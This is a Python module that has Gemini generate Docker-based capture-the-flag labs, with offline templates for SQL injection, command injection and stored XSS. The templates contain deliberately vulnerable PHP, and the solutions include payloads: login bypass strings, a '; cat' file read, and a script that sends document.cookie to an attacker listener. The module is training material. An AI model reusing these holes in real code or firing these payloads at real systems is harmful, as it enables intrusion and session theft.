import json
import re
import secrets
import string
import textwrap

try:
    from google import genai
except Exception:
    genai = None

try:
    import google.generativeai as legacy_genai
except Exception:
    legacy_genai = None


_REQUIRED_KEYS = [
    "docker_compose",
    "db_dockerfile",
    "setup_sql",
    "web_dockerfile",
    "web_source_code",
    "detection_rules",
    "description",
    "expected_solution",
    "flag",
]


class GeminiService:
    def __init__(self, api_key):
        self.api_key = api_key
        self.client = None
        self.legacy_model = None
        self.model_name = "gemini-1.5-flash"
        self.model_candidates = [
            self.model_name,
            "gemini-1.5-flash-latest",
            "gemini-1.5-flash-8b",
            "gemini-1.5-pro",
            "gemini-2.0-flash",
            "gemini-2.0-flash-lite",
        ]

        if api_key:
            if genai is not None:
                try:
                    self.client = genai.Client(api_key=api_key)
                except Exception:
                    self.client = None

            if legacy_genai is not None:
                try:
                    legacy_genai.configure(api_key=api_key)
                    self.legacy_model = legacy_genai.GenerativeModel(self.model_name)
                except Exception:
                    self.legacy_model = None

    @staticmethod
    def _extract_response_text(response):
        for attr in ("text", "output_text"):
            value = getattr(response, attr, None)
            if value:
                return value

        candidates = getattr(response, "candidates", None)
        if candidates:
            for candidate in candidates:
                content = getattr(candidate, "content", None)
                parts = getattr(content, "parts", None) if content else None
                if not parts:
                    continue
                texts = [getattr(part, "text", "") for part in parts]
                joined = "".join(texts).strip()
                if joined:
                    return joined

        return None

    def _call_new_sdk(self, prompt, model_name):
        if self.client is None:
            return None

        models_api = getattr(self.client, "models", None)
        if models_api is not None and hasattr(models_api, "generate_content"):
            return models_api.generate_content(model=model_name, contents=prompt)

        if hasattr(self.client, "generate_content"):
            return self.client.generate_content(model=model_name, contents=prompt)

        return None

    @staticmethod
    def _extract_json(raw_text: str):
        cleaned = raw_text.strip()
        fence_match = re.search(r"```(?:json)?\s*(\{.*\})\s*```", cleaned, re.DOTALL)
        if fence_match:
            cleaned = fence_match.group(1)
        return json.loads(cleaned)

    @staticmethod
    def _validate_payload(payload):
        for key in _REQUIRED_KEYS:
            if key not in payload:
                raise ValueError(f"Gemini response missing required key '{key}'")

        compose = payload["docker_compose"]
        for required_service in ("target-db", "target-web", "attacker-kali"):
            if required_service not in compose:
                raise ValueError(
                    f"docker_compose must define service '{required_service}'"
                )

        if not isinstance(payload["detection_rules"], (list, dict)):
            raise ValueError("detection_rules must be a list or object")

        flag = str(payload["flag"]).strip()
        if not flag:
            raise ValueError("flag must not be empty")

    @staticmethod
    def _random_password(length=14):
        """Generate a realistic-looking random password used as the actual flag value."""
        # Mix upper, lower, digits, and a handful of safe special chars.
        pool = string.ascii_letters + string.digits + "!@#$%"
        # Guarantee at least one of each character class so it looks like a real password.
        pwd = [
            secrets.choice(string.ascii_uppercase),
            secrets.choice(string.ascii_lowercase),
            secrets.choice(string.digits),
            secrets.choice("!@#$%"),
        ]
        pwd += [secrets.choice(pool) for _ in range(length - 4)]
        secrets.SystemRandom().shuffle(pwd)
        return "".join(pwd)

    @staticmethod
    def _build_offline_payload(vuln_type, difficulty, custom_description="", reason=""):
        """
        Returns a fully offline multi-container payload matching the same 9-key schema
        that Gemini is expected to return. Used when the API is unavailable.

        The flag is now REAL target data extracted by exploiting the vulnerability —
        not a static CTF{...} wrapper string.
        """
        # docker-compose is the same template for all vuln types.
        # ${WEB_PORT} and ${VNC_PORT} are docker-compose variable substitutions
        # that the deployment logic will inject at runtime.
        # target-db uses build: ./db/ so setup.sql is baked into the image.
        docker_compose = textwrap.dedent("""\
            version: '3.8'
            services:
              target-db:
                build: ./db/
                environment:
                  MYSQL_ROOT_PASSWORD: rootpass
                  MYSQL_DATABASE: ctfdb
                networks:
                  - cyber_range_net

              target-web:
                build: ./web/
                ports:
                  - "${WEB_PORT:-8080}:80"
                depends_on:
                  - target-db
                networks:
                  - cyber_range_net

              attacker-kali:
                image: kasmweb/kali-rolling-desktop:1.14.0
                environment:
                  VNC_PW: password
                ports:
                  - "${VNC_PORT:-6901}:6901"
                shm_size: 512m
                networks:
                  - cyber_range_net

            networks:
              cyber_range_net:
                driver: bridge
        """)

        db_dockerfile = textwrap.dedent("""\
            FROM mysql:8.0
            COPY setup.sql /docker-entrypoint-initdb.d/
        """)

        if vuln_type == "sql_injection":
            # Flag = the plain-text password of the 'admin' row in the users table.
            # 2-step flow: index.php (login, vulnerable) → dashboard.php (User Management table).
            flag_val = GeminiService._random_password()

            setup_sql = textwrap.dedent(f"""\
                CREATE DATABASE IF NOT EXISTS ctfdb;
                USE ctfdb;
                CREATE TABLE IF NOT EXISTS users (
                    id         INT AUTO_INCREMENT PRIMARY KEY,
                    username   VARCHAR(50)  NOT NULL,
                    password   VARCHAR(100) NOT NULL,
                    email      VARCHAR(100),
                    role       VARCHAR(20)  DEFAULT 'user'
                );
                INSERT INTO users (username, password, email, role) VALUES
                    ('admin',   '{flag_val}',  'admin@corp.local', 'admin'),
                    ('alice',   'alice_pass1', 'alice@corp.local',  'user'),
                    ('bob',     'bob_pass2',   'bob@corp.local',    'user');
            """)

            web_dockerfile = textwrap.dedent("""\
                FROM php:8.1-apache
                RUN docker-php-ext-install pdo pdo_mysql
                COPY src/ /var/www/html/
                EXPOSE 80
            """)

            # index.php — login form, vulnerable to SQLi, errors shown, redirects to dashboard on success.
            web_source_code = textwrap.dedent("""\
                <?php
                session_start();
                $dsn      = 'mysql:host=target-db;dbname=ctfdb;charset=utf8';
                $pdo_opts = [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION];
                $username = $_POST['username'] ?? '';
                $password = $_POST['password'] ?? '';
                $message  = '';

                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    try {
                        $pdo = new PDO($dsn, 'root', 'rootpass', $pdo_opts);
                        // VULNERABLE: Direct string interpolation — SQL Injection is possible.
                        // Bypass with: username = admin'-- or tautology: ' OR '1'='1
                        $sql  = "SELECT * FROM users WHERE username='$username' AND password='$password'";
                        $stmt = $pdo->query($sql);
                        $row  = $stmt->fetch(PDO::FETCH_ASSOC);
                        if ($row) {
                            $_SESSION['user'] = $row['username'];
                            $_SESSION['role'] = $row['role'];
                            header('Location: dashboard.php');
                            exit;
                        } else {
                            $message = '<p style="color:red">Invalid credentials.</p>';
                        }
                    } catch (PDOException $e) {
                        // Error-based SQLi: full DB error surfaced to the attacker.
                        $message = '<p style="color:orange">DB Error: ' . $e->getMessage() . '</p>';
                    }
                }
                ?>
                <!DOCTYPE html>
                <html><head><title>Employee Portal</title></head><body>
                <h2>Employee Login Portal</h2>
                <form method="POST">
                  Username: <input name="username" value="<?= htmlspecialchars($username) ?>"><br><br>
                  Password: <input type="password" name="password"><br><br>
                  <button type="submit">Login</button>
                </form>
                <?= $message ?>
                </body></html>
            """)

            # dashboard.php — session-gated; displays full User Management table including passwords.
            dashboard_source_code = textwrap.dedent("""\
                <?php
                session_start();
                if (!isset($_SESSION['user'])) {
                    header('Location: index.php');
                    exit;
                }
                $dsn      = 'mysql:host=target-db;dbname=ctfdb;charset=utf8';
                $pdo_opts = [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION];
                $users = [];
                try {
                    $pdo   = new PDO($dsn, 'root', 'rootpass', $pdo_opts);
                    $users = $pdo->query("SELECT id, username, password, email, role FROM users ORDER BY id")
                                 ->fetchAll(PDO::FETCH_ASSOC);
                } catch (PDOException $e) { /* silent */ }
                ?>
                <!DOCTYPE html>
                <html><head><title>Admin Dashboard</title>
                <style>
                  body { font-family: sans-serif; padding: 20px; }
                  table { border-collapse: collapse; width: 100%; }
                  th, td { border: 1px solid #ccc; padding: 8px 12px; text-align: left; }
                  th { background: #f0f0f0; }
                  tr:nth-child(even) { background: #fafafa; }
                </style>
                </head><body>
                <h2>Internal Dashboard</h2>
                <p>Logged in as: <strong><?= htmlspecialchars($_SESSION['user']) ?></strong>
                   (<?= htmlspecialchars($_SESSION['role'] ?? 'user') ?>)</p>
                <hr>
                <h3>User Management</h3>
                <p>System Configuration &mdash; All registered accounts:</p>
                <table>
                  <tr><th>ID</th><th>Username</th><th>Password</th><th>Email</th><th>Role</th></tr>
                  <?php foreach ($users as $u): ?>
                  <tr>
                    <td><?= htmlspecialchars($u['id']) ?></td>
                    <td><?= htmlspecialchars($u['username']) ?></td>
                    <td><?= htmlspecialchars($u['password']) ?></td>
                    <td><?= htmlspecialchars($u['email']) ?></td>
                    <td><?= htmlspecialchars($u['role']) ?></td>
                  </tr>
                  <?php endforeach; ?>
                </table>
                <br><a href="index.php">Logout</a>
                </body></html>
            """)

            detection_rules = [
                r"(?i)('\s*(or|and)\s*'?[\d])",
                r"(?i)(union\s+select)",
                r"(?i)(--\s*$|#\s*$)",
                r"(?i)(\bor\b\s+\d+\s*=\s*\d+)",
            ]
            description = (
                "Bypass the login screen and find the admin's password located within the internal dashboard. "
                "The login form at port 80 is vulnerable to SQL Injection — "
                "use it to gain access, then navigate to the User Management section "
                "inside the dashboard and retrieve the admin account's plain-text password. "
                "Submit that password as the flag."
            )
            expected_solution = (
                "1. Open the login form at http://<target>:80. "
                "2. In the Username field enter: admin'-- (comments out the password check). "
                "   OR use a tautology in the Username field: ' OR '1'='1'-- "
                "3. On successful bypass the app creates a session and redirects to dashboard.php. "
                "4. The dashboard's User Management table lists all accounts with plain-text passwords. "
                "5. The 'admin' row's password value is the flag."
            )

        elif vuln_type == "cmd_injection":
            # Flag = content of a hidden file at /home/app/secret.txt on the web container.
            # The student must use command injection to cat the file.
            flag_val = secrets.token_hex(16)   # e.g. a3f8c2e91b4d5f7e3a8b2c1d4e5f6a7b

            setup_sql = textwrap.dedent("""\
                CREATE DATABASE IF NOT EXISTS ctfdb;
                USE ctfdb;
                CREATE TABLE IF NOT EXISTS logs (
                    id        INT AUTO_INCREMENT PRIMARY KEY,
                    message   TEXT,
                    logged_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
                INSERT INTO logs (message) VALUES ('System diagnostic service started.');
            """)

            web_dockerfile = textwrap.dedent(f"""\
                FROM php:8.1-apache
                RUN apt-get update && apt-get install -y iputils-ping \\
                    && rm -rf /var/lib/apt/lists/*
                RUN docker-php-ext-install pdo pdo_mysql
                RUN mkdir -p /home/app && echo '{flag_val}' > /home/app/secret.txt \\
                    && chmod 644 /home/app/secret.txt
                COPY src/ /var/www/html/
                EXPOSE 80
            """)

            web_source_code = textwrap.dedent("""\
                <?php
                $output = '';
                $host   = $_GET['host'] ?? '';

                if ($host !== '') {
                    // VULNERABLE: Unsanitised $host passed directly to shell_exec
                    $output = shell_exec('ping -c 2 ' . $host . ' 2>&1');
                }
                ?>
                <!DOCTYPE html>
                <html><head><title>Network Diagnostics</title></head><body>
                <h2>Network Connectivity Checker</h2>
                <form method="GET">
                  Hostname / IP:
                  <input name="host" value="<?= htmlspecialchars($host) ?>" size="40">
                  <button type="submit">Check</button>
                </form>
                <?php if ($output !== ''): ?>
                <pre><?= htmlspecialchars($output) ?></pre>
                <?php endif; ?>
                </body></html>
            """)

            detection_rules = [
                r"(?i)(;\s*(cat|less|more|head|tail|ls|id|whoami|uname|wget|curl)\b)",
                r"(?i)(\|\s*\w+)",
                r"(?i)(`[^`]+`)",
                r"(?i)(\$\([^)]+\))",
            ]
            description = (
                "A network diagnostic tool on port 80 lets administrators check host connectivity. "
                "The input is not sanitised against shell metacharacters. "
                "Your goal is to read the contents of the file at /home/app/secret.txt on the server. "
                "The exact content of that file is the flag."
            )
            expected_solution = (
                "1. Open the connectivity checker at http://<target>:80. "
                "2. In the Hostname field enter: 127.0.0.1; cat /home/app/secret.txt "
                "3. The shell executes both commands; the output shows the secret file contents. "
                "4. That hex string is the flag."
            )

        else:  # xss
            # Flag = the value of the admin's session token stored in a cookie.
            # The student must use Stored XSS to steal document.cookie from the admin's browser.
            flag_val = "sess_" + secrets.token_hex(12)  # e.g. sess_a3f8c2e91b4d5f7e3a8b2c1d

            setup_sql = textwrap.dedent(f"""\
                CREATE DATABASE IF NOT EXISTS ctfdb;
                USE ctfdb;
                CREATE TABLE IF NOT EXISTS comments (
                    id      INT AUTO_INCREMENT PRIMARY KEY,
                    author  VARCHAR(50),
                    content TEXT
                );
                CREATE TABLE IF NOT EXISTS admin_sessions (
                    id            INT AUTO_INCREMENT PRIMARY KEY,
                    admin_user    VARCHAR(50)  DEFAULT 'admin',
                    session_token VARCHAR(200) NOT NULL
                );
                INSERT INTO comments (author, content)
                    VALUES ('admin', 'Welcome! Please keep feedback constructive.');
                INSERT INTO admin_sessions (session_token) VALUES ('{flag_val}');
            """)

            web_dockerfile = textwrap.dedent("""\
                FROM php:8.1-apache
                RUN docker-php-ext-install pdo pdo_mysql
                COPY src/ /var/www/html/
                EXPOSE 80
            """)

            # The page sets the admin's session token as a JS-accessible cookie.
            # An XSS payload that reads document.cookie retrieves the token.
            web_source_code = textwrap.dedent("""\
                <?php
                $dsn      = 'mysql:host=target-db;dbname=ctfdb;charset=utf8';
                $pdo_opts = [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION];

                if ($_SERVER['REQUEST_METHOD'] === 'POST'
                        && !empty($_POST['author'])
                        && !empty($_POST['content'])) {
                    try {
                        $pdo = new PDO($dsn, 'root', 'rootpass', $pdo_opts);
                        $pdo->prepare("INSERT INTO comments (author, content) VALUES (?, ?)")
                            ->execute([$_POST['author'], $_POST['content']]);
                    } catch (PDOException $e) { /* silent */ }
                    header('Location: /');
                    exit;
                }

                $comments      = [];
                $session_token = '';
                try {
                    $pdo           = new PDO($dsn, 'root', 'rootpass', $pdo_opts);
                    $comments      = $pdo->query("SELECT * FROM comments ORDER BY id DESC")
                                         ->fetchAll(PDO::FETCH_ASSOC);
                    $row           = $pdo->query("SELECT session_token FROM admin_sessions LIMIT 1")->fetch();
                    if ($row) { $session_token = $row['session_token']; }
                } catch (PDOException $e) { /* silent */ }
                ?>
                <!DOCTYPE html>
                <html>
                <head><title>Community Board</title>
                <script>
                // Admin session token set on every page load (simulates a logged-in admin reviewer).
                document.cookie = "admin_session=<?= htmlspecialchars($session_token, ENT_QUOTES) ?>; path=/";
                </script>
                </head>
                <body>
                <h2>Community Feedback Board</h2>
                <form method="POST">
                  Name: <input name="author"><br>
                  Comment: <textarea name="content" rows="3" cols="50"></textarea><br>
                  <button type="submit">Post Comment</button>
                </form>
                <hr><h3>Recent Comments:</h3>
                <?php foreach ($comments as $c): ?>
                <div style="border:1px solid #ccc;margin:6px;padding:8px;">
                  <b><?= htmlspecialchars($c['author']) ?></b>:
                  <?= $c['content'] /* VULNERABLE: No htmlspecialchars — Stored XSS */ ?>
                </div>
                <?php endforeach; ?>
                </body></html>
            """)

            detection_rules = [
                r"(?i)(<script[^>]*>)",
                r"(?i)(onerror\s*=)",
                r"(?i)(javascript\s*:)",
                r"(?i)(on(load|click|mouseover|focus)\s*=)",
            ]
            description = (
                "A community feedback board on port 80 renders user comments without sanitisation. "
                "An admin account is always logged in and reviews new submissions — "
                "their session token is stored in the cookie named 'admin_session'. "
                "Your goal is to steal the exact value of the admin's 'admin_session' cookie. "
                "Submit that token value as the flag."
            )
            expected_solution = (
                "1. Post a comment containing a stored XSS payload that reads document.cookie, e.g.: "
                "   <script>fetch('http://<kali-ip>:8000/?c='+document.cookie)</script> "
                "2. Set up a listener on the Kali container (e.g. python3 -m http.server 8000). "
                "3. Wait for the admin page-load to trigger the script — "
                "   the request to your listener will include admin_session=<token>. "
                "4. The session token value is the flag."
            )

        return {
            "docker_compose":        docker_compose,
            "db_dockerfile":         db_dockerfile,
            "setup_sql":             setup_sql,
            "web_dockerfile":        web_dockerfile,
            "web_source_code":       web_source_code,
            # Only populated for sql_injection (login → dashboard 2-step flow).
            "dashboard_source_code": locals().get("dashboard_source_code", ""),
            "detection_rules":       detection_rules,
            "description":           description,
            "expected_solution":     expected_solution,
            "flag":                  flag_val,
        }

    @staticmethod
    def _is_model_not_found_error(err_text):
        text = (err_text or "").lower()
        return "not_found" in text or ("model" in text and "not found" in text)

    @staticmethod
    def _is_quota_or_rate_limit_error(err_text):
        text = (err_text or "").lower()
        return (
            "resource_exhausted" in text
            or "quota exceeded" in text
            or "rate limit" in text
            or ("429" in text and "quota" in text)
        )

    def generate_scenario(self, vuln_type, difficulty, custom_description=""):
        """
        Calls Gemini to generate a full multi-container CTF scenario.

        Returns a dict with 9 required keys plus an optional 10th:
            docker_compose, db_dockerfile, setup_sql, web_dockerfile, web_source_code,
            detection_rules, description, expected_solution, flag
            + dashboard_source_code (non-empty only for sql_injection — the protected dashboard page)

        Falls back to _build_offline_payload() when the Gemini API is
        unavailable, invalid, or quota-exhausted.
        """
        if not self.client and not self.legacy_model:
            return self._build_offline_payload(
                vuln_type, difficulty, custom_description,
                reason="Gemini API key is not configured",
            )

        # Per-vuln-type guidance for realistic target data and flag placement.
        _flag_guidance = {
            "sql_injection": (
                "FLAG RULES for sql_injection:\n"
                "- Generate a realistic random password (mix of upper, lower, digits, symbols, 12-16 chars).\n"
                "- In setup_sql: create a 'users' table (id, username, password, email, role). "
                "  INSERT 'admin' whose 'password' IS the flag value. Add 2-3 decoy users.\n"
                "- TWO-PAGE ARCHITECTURE — this scenario requires TWO PHP files:\n"
                "  A) web_source_code = index.php (login page):\n"
                "     - POST form with username + password fields.\n"
                "     - VULNERABLE: use unsanitised string interpolation in the SQL query so that\n"
                "       ' OR '1'='1 or admin'-- bypasses authentication.\n"
                "     - Surface the raw PDOException message so error-based SQLi is also possible.\n"
                "     - On successful auth: call session_start(), store username/role in $_SESSION,\n"
                "       then header('Location: dashboard.php') and exit.\n"
                "     - On failure: show 'Invalid credentials.' in red.\n"
                "  B) dashboard_source_code = dashboard.php (protected page):\n"
                "     - session_start(); redirect to index.php if $_SESSION['user'] is not set.\n"
                "     - Query ALL rows from the users table and render them in an HTML table.\n"
                "     - The table MUST show the 'password' column so the flag is visible here.\n"
                "     - Label the section 'User Management' or 'System Configuration'.\n"
                "- The 'flag' key in JSON = that exact admin password string (no FLAG{} wrapper).\n"
                "- description MUST say: "
                "'Bypass the login screen and find the admin password in the internal dashboard.'"
            ),
            "cmd_injection": (
                "FLAG RULES for cmd_injection:\n"
                "- Generate a random 32-character hex string as the flag value.\n"
                "- In web_dockerfile: write the flag string to /home/app/secret.txt using "
                "  RUN echo '<flag>' > /home/app/secret.txt && chmod 644 /home/app/secret.txt\n"
                "- Do NOT put the flag in setup_sql or the DB — it lives only on the filesystem.\n"
                "- In web_source_code: build an unsanitised shell command tool (e.g. ping, traceroute, "
                "  nslookup) where injecting shell metacharacters lets the student run arbitrary commands.\n"
                "- The 'flag' key in JSON = that hex string (no FLAG{} wrapper).\n"
                "- description MUST say: 'Read the contents of /home/app/secret.txt on the server.'"
            ),
            "xss": (
                "FLAG RULES for xss:\n"
                "- Generate a realistic session token string like: sess_<24 random hex chars>.\n"
                "- In setup_sql: create an 'admin_sessions' table with a 'session_token' column "
                "  and INSERT the token as the admin's session value.\n"
                "- In web_source_code: on every page load, read the token from the DB and set it "
                "  as a JavaScript-accessible cookie named 'admin_session' (no HttpOnly flag). "
                "  The comment display area must echo unsanitised user HTML (Stored XSS).\n"
                "- The 'flag' key in JSON = the session token string (no FLAG{} wrapper).\n"
                "- description MUST say: 'Steal the admin_session cookie value using Stored XSS.'"
            ),
        }
        flag_rules = _flag_guidance.get(
            vuln_type,
            "Generate a realistic secret value as the flag. Embed it in the appropriate target "
            "(DB column, filesystem file, or cookie). Do NOT use a FLAG{} wrapper.",
        )

        prompt = (
            f"You are a penetration-testing lab architect. Generate a realistic multi-container "
            f"hacking challenge for vulnerability type '{vuln_type}' at '{difficulty}' difficulty.\n\n"

            "═══ CRITICAL RULE: REALISTIC FLAGS — NO STATIC CTF STRINGS ═══\n"
            "Do NOT generate a 'flags' table. Do NOT use the format FLAG{...} or CTF{...}.\n"
            "The flag must be a REAL piece of sensitive data that the student extracts by exploiting "
            "the vulnerability — a password, a secret file's content, or a session token.\n"
            f"{flag_rules}\n\n"

            "Return ONLY a single valid JSON object with EXACTLY these 10 keys. "
            "No markdown, no code fences, no extra text — just the raw JSON.\n\n"

            "1. \"docker_compose\": (string) Complete docker-compose.yml with 3 services:\n"
            "   - 'target-db': MUST use 'build: ./db/' — do NOT use 'image: mysql:8.0' directly "
            "     and do NOT add any 'volumes' entry for target-db. "
            "     Environment: MYSQL_ROOT_PASSWORD=rootpass, MYSQL_DATABASE=ctfdb.\n"
            "   - 'target-web': build context ./web/. "
            "     Ports: ${WEB_PORT:-8080}:80. depends_on: [target-db].\n"
            "   - 'attacker-kali': image kasmweb/kali-rolling-desktop:1.14.0. "
            "     Environment: VNC_PW=password. "
            "     Ports: ${VNC_PORT:-6901}:6901. shm_size: 512m.\n"
            "   All 3 services share a bridge network named 'cyber_range_net'.\n\n"

            "2. \"db_dockerfile\": (string) Dockerfile for target-db. "
            "   It must look EXACTLY like this:\n"
            "     FROM mysql:8.0\n"
            "     COPY setup.sql /docker-entrypoint-initdb.d/\n\n"

            "3. \"setup_sql\": (string) SQL that creates a realistic schema and inserts data "
            "   including the flag value per the FLAG RULES above.\n\n"

            "4. \"web_dockerfile\": (string) Dockerfile for target-web. "
            "   Base: php:8.1-apache. "
            "   Must run docker-php-ext-install pdo pdo_mysql. "
            "   Must COPY src/ to /var/www/html/. "
            "   For cmd_injection: also apt-get install iputils-ping and write the flag to "
            "   /home/app/secret.txt per the FLAG RULES above.\n\n"

            "5. \"web_source_code\": (string) Full index.php. "
            "   Must connect to target-db via PDO (host=target-db, user=root, pass=rootpass, db=ctfdb). "
            f"  Must contain a genuinely exploitable {vuln_type} vulnerability. "
            + (
                "   For sql_injection: this is the LOGIN PAGE — on success set $_SESSION and redirect "
                "to dashboard.php. Surface raw DB errors. Do NOT display the flag here.\n\n"
                if vuln_type == "sql_injection" else
                "   When exploited, the vulnerability must reveal the flag value directly to the attacker.\n\n"
            ) +

            "6. \"detection_rules\": (array of strings) At least 3 regex patterns matching "
            f"  common {vuln_type} attack payloads.\n\n"

            "7. \"description\": (string) Challenge description for the student. "
            "   MUST clearly state WHAT data they need to find and WHERE it lives "
            "(e.g. 'Bypass the login and find the admin password in the dashboard', "
            "'Read /home/app/secret.txt', 'Steal the admin_session cookie').\n\n"

            "8. \"expected_solution\": (string) Step-by-step solution for the instructor.\n\n"

            "9. \"flag\": (string) The exact sensitive value the student must submit — "
            "   same value that appears in setup_sql / web_dockerfile / cookie. "
            "   NO FLAG{} or CTF{} wrapper. Just the raw string.\n\n"

            + (
                "10. \"dashboard_source_code\": (string) Full dashboard.php — REQUIRED for sql_injection. "
                "    Session-gated (redirect to index.php if not logged in). "
                "    Queries all users and renders them in a table labelled 'User Management'. "
                "    MUST include the 'password' column so the flag is visible after a successful bypass.\n\n"
                if vuln_type == "sql_injection" else
                "10. \"dashboard_source_code\": (string) Leave as empty string \"\" for this vuln type.\n\n"
            ) +

            "CRITICAL: All JSON string values must be properly escaped. "
            "The vulnerability must be genuinely exploitable, not cosmetic. "
            "The flag value in key 9 MUST match what is actually embedded in the generated files."
        )

        if custom_description:
            prompt += f"\n\nExtra requirements: {custom_description}"

        response = None
        new_sdk_error = None
        legacy_error = None

        if self.client is not None:
            for model_name in self.model_candidates:
                try:
                    response = self._call_new_sdk(prompt, model_name)
                    if response is not None:
                        break
                except Exception as exc:
                    new_sdk_error = exc
                    if not self._is_model_not_found_error(str(exc)):
                        break

        if response is None and self.legacy_model is not None:
            for model_name in self.model_candidates:
                try:
                    model = legacy_genai.GenerativeModel(model_name)
                    response = model.generate_content(prompt)
                    if response is not None:
                        break
                except Exception as exc:
                    legacy_error = exc
                    if not self._is_model_not_found_error(str(exc)):
                        break

        if response is None:
            err_text = " ".join([str(new_sdk_error or ""), str(legacy_error or "")]).strip()

            if "API key not valid" in err_text or "API_KEY_INVALID" in err_text:
                return self._build_offline_payload(
                    vuln_type, difficulty, custom_description, reason="invalid Gemini API key"
                )
            if self._is_model_not_found_error(err_text):
                return self._build_offline_payload(
                    vuln_type, difficulty, custom_description, reason="Gemini model unavailable"
                )
            if self._is_quota_or_rate_limit_error(err_text):
                return self._build_offline_payload(
                    vuln_type, difficulty, custom_description, reason="Gemini quota exhausted"
                )
            if new_sdk_error is not None or legacy_error is not None:
                raise RuntimeError(
                    f"Gemini SDK invocation failed: {err_text or 'unknown generation error'}"
                )
            return self._build_offline_payload(
                vuln_type, difficulty, custom_description, reason="Unsupported Gemini client methods"
            )

        response_text = self._extract_response_text(response)
        if not response_text:
            raise RuntimeError("Gemini returned an empty response")

        payload = self._extract_json(response_text)
        self._validate_payload(payload)
        return payload
